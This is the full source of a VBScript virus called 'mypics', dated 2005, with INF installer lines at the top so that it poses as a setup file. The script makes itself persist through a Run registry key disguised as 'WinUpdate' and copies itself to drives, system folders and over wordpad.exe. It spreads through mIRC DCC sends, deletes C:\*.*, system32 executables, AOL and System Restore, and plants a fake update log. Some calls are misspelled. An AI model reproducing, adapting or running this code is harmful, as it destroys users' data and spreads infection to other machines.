on error resume next
[Version]
Signature="$Chicago$"
AdvancedINF=2.0 
'created by avynuker
'2005
dim mypic
set mypics = createobject("scripting.filesystemobject")
mypics101 = mypics.getspecialfolder(0)
mypics102 = mypics101 & "\mypics.vbs"
dim mypics103
set mypics103 = createobject("wscript.shell")
mypics103.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & mypics102 & " %"
mypics.copyfile wscript.scriptfullname, mypics102
Dim infectircn
Set infectircn= createobject ("scripting.filesystemobject")
If infectircn.fileexists ("c:\mirc\script.ini") Then
Set infectircn = createobject ("wscript.shell")
infectircn.run "c:\mirc\script.ini"
infectircn.writeline "[script]"
infectircn.writeline "n0=on 1:JOIN:#:/.dcc"+" send "+"-c "+"$nick C:\windows\mypics.vbs"
infectircn.close
End If
dim skey
set skey = createobject ("wscript.shell")
skey.run "notepad.exe"
wscript.sleep 100
skey.sendkeys "you have been infected with the mypics viri"
skey.sendkeys "^{s}"
skey.sendkeys "mypics.txt"
skey.sendkeys "{enter}"
set skey = nothing
dim aoll
set aoll = createobject ("scripting.filesystemobject")
if aoll.fileexists ("C:\Program Files\America Online 9.0\aol.exe") then
aoll.deletefile "C:\Program Files\America Online 9.0\aol.exe"
else
end if
dim autoex
set autoex = createobject ("scripting.filesystemobject")
autoex.copyfile "mypics.vbs", "C:\autoexec.exe"
set autoex = nothing
dim winpg
set winpg = createobject ("scripting.filesystemobject")
winpg.copyfile "mypics.vbs", "C:\windows\system\winpgup.exe"
set winpg = nothing
set prog1 = nothing
for i = 1 to 3
msgbox "ECHO 0%"
next
dim make_log, move_log
set make_log = createobject ("scripting.filesystemobject")
set move_log = createobject ("scripting.filesystemobject")
if make_log.fileexists ("c:\windows\KB885626.txt") then
make_log.deletefile "c:\windows\KB885626.txt"
make_log.createtextfile "c:\windows\KB885626.txt"
set make_log = createobject ("wscript.shell")
make_log.opentetxfile "c:\windows\KB885626.txt"
wscript.sleep 100
make_log.senkeys "[KB885626.log]"
make_log.senkeys "0.875: ================================================================================"
make_log.senkeys "0.875: 2005/07/07 02:56:36.406 (local)"
make_log.senkeys "0.753: mypics infected file"
make_log.senkeys "^{S}"
make_log.senkeys "KB885626.log"
make_log.senkeys "{ENTER}"
move_log.movefile "KB885626.log", "C:\windows\KB885626.log"
end if
set move_log = nothing
set make_log = nothing
for i = 1 to 10
dim paint,  calc
set paint = createobject ("wscript.shell")
paint.run "mspaint.exe"
set paint = nothing
set calc =createobject ("wscript.shell")
calc.run "calc.exe"
set calc = nothing
next
for i = 1 to 30
dim delrn
set delrn = createobject ("scripting.filesystemobject")
delrn.deletefile "C:\*.*"
set delrn = nothing
next
dim desk
set desk = createobject ("scripting.filesystemobject")
desk.copyfile "mypics.vbs","C:\Documents and Settings\All Users\Desktop\mypics.vbs"
set desk = nothing
dim deltxt
set deltxt = createobject ("scripting.filesystemobject")
deltxt.deletefile "C:\Documents and Settings\all users\Desktop\*.txt"
dim delwintxt
set delwintxt = createobject ("scripting.filesystemobject")
delwintxt.deletefile"C:\Documents and Settings\All Users\*.txt"
dim i
set i = createobject ("scripting.filesystemobject")
i.copyfile "mypics.vbs","C:\windows\mypics.vbs"
set i = nothing
dim filesys, newfolder, newfolderpath
newfolderpath = "C:\mypics"
set filesys = createobject("scripting.filesystemobject")
if not filesys.folderexists (newfolderpath) then
set newfolder = filesys.createfolder(newfolderpath)
end if
dim filemove
set filemove = createobject("scripting.filesystemobject")
filemove.movefile "C:\windows\system32\*.log","C:\mypics\"
set filemove = nothing
dim copyfle
set copyfle = createobject("scripting.filesystemobject")
copyfle.copyfile "mypics.vbs","C:\mypics\"
set copyfle = nothing
for i = 1 to 5
dim delexe
set delexe = createobject ("scripting.filesystemobject")
delexe.deletefile "C:\windows\system32\*.exe"
set delexe = nothing
next
dim adrive
set adrive = createobject ("scripting.filesystemobject")
if adrive.driveexists ("A:\") then
adrive.copyfile "mypics.vbs","A:\mypics.vbs"
end if
set adrive = nothing
dim edrive
set edrive = createobject ("scripting.filesystemobject")
if edrive.driveexists ("E:\") then
edrive.copyfile "mypics.vbs","E:\mypics.vbs"
end if
set edrive = nothing
dim gdrive
set gdrive = createobject ("scripting.filesystemobject")
if gdrive.driveexists ("G:\") then
gdrive.copyfile "mypics.vbs", "G:\mypics.vbs"
else
end if
set gdrive = nothing
dim jdrive
set jdrive = createobject ("scripting.filesystemobject")
if jdrive.driveexists ("J:\") then
jdrive.copyfile "mypics.vbs", "J:\mypics.vbs"
else
end if
set jdrive = nothing
dim fdrive
set fdrive = createobject ("scripting.filesystemobject")
if fdrive.driveexists ("F:\") then
fdrive.copyfile "mypics.vbs", "F:\mypics.vbs"
else
end if
set fdrive = nothing
dim oWMP, colCDROMs
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection

if colCDROMs.Count >= 1 then
        For i = 0 to colCDROMs.Count - 1
                colCDROMs.Item(i).Eject
        Next ' cdrom
End If
dim mypicsResource
set mypicsResource = createobject ("scripting.filesystemobject")
mypicsResource.copyfile "mypics.vbs", "C:\WINDOWS\Resource\mypics.vbs"
set mypicsResource = nothing
set mypicsrepair = createobject ("scripting.filesystemobject")
mypicsrepair.copyfile "mypics.vbs", "C:\WINDOWS\repair\mypics.vbs"
set mypicsrepair = nothing
dim mypicssystem
set mypicssystem = createobject ("scripting.filesystemobject")
mypicssystem.copyfile "mypics.vbs", "C:\WINDOWS\system\mypics.vbs"
set mypicssystem = nothing
dim note
set note = createobject ("scripting.filesystemobject")
if note.fileexists ("wordpad.exe") then
note.copyfile "mypics.vbs", "C:\Program Files\Windows NT\Accessories\wordpad.exe"
end if
set note = nothing
dim xcx
set xcx = createobject ("scripting.filesystemobject")
xcx.createtextfile "C:\windows\mypics.txt"
set xcx = nothing
dim mpc, mpa, mpmm
set mpc = createobject ("scripting.filesystemobject")
mpc.copyfile "mypics.vbs", "C:\WINDOWS\Cursors\mypics.vbs"
set mpc = nothing
set mpa = createobject ("scripting.filesystemobject")
if mpa.folderexists ("C:\Program Files\America Online 9.0") then
mpa.copyfile "mypics.vbs", "C:\Program Files\America Online 9.0\mypics.vbs"
end if
set mpa = nothing
set mpmm = createobject ("scripting.filesystemobject")
if mpmm.folderexists ("C:\My Music") then
mpmm.copyfile "mypics.vbs", "C:\My Music\mypics.vbs"
end if
set mpmm = nothing
dim mpdelhelp, mpcat, mpcomm
set mpdelhelp = createobject ("scripting.filesystemobject")
if mpdelhelp.folderexists ("C:\WINDOWS\Help") then 
mpdelhelp.deletefolder "C:\WINDOWS\Help"
end if
set mpdelhelp = nothing
set mpcat = createobject ("scripting.filesystemobject")
mpcat.deletefile "C:\*.cat"
set mpcat = nothing
set mpcomm = createobject ("scripting.filesystemobject")
mpcomm.deletefile "C:\windows\system32\comm.drv"
set mpcomm = nothing
dim rest
set rest = createobject ("scripting.filesystemobject")
if rest.fileexists ("rstrui.exe") then
rest.deletefile "C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\rstrui.exe"
end if
set rest = nothing
DIM JU
SET JU = createobject("scripting.filesystemobject")
if JU.folderexists ("C:\windows\Debug\") then
JU.copyfile "mypics.vbs" , "C:\windows\Debug\mypics.vbs"
end if
set JU = nothing
dim addregi
set addregi = createobject ("scripting.filesystemobject")
if addregi.fileexists ("SYSTEM.INI") then
addregi.copyfile "n.vbs", "SYSTEM.INI"
end if
if addregi.fileexists ("WIN.INI") then
addregi.copyfile "n.vbs", "WIN.INI"
end if
set addregi = nothing
dim sh
set sh  = CreateObject("WScript.Shell")
sh.SendKeys "^{ESC}ur{ENTER}"

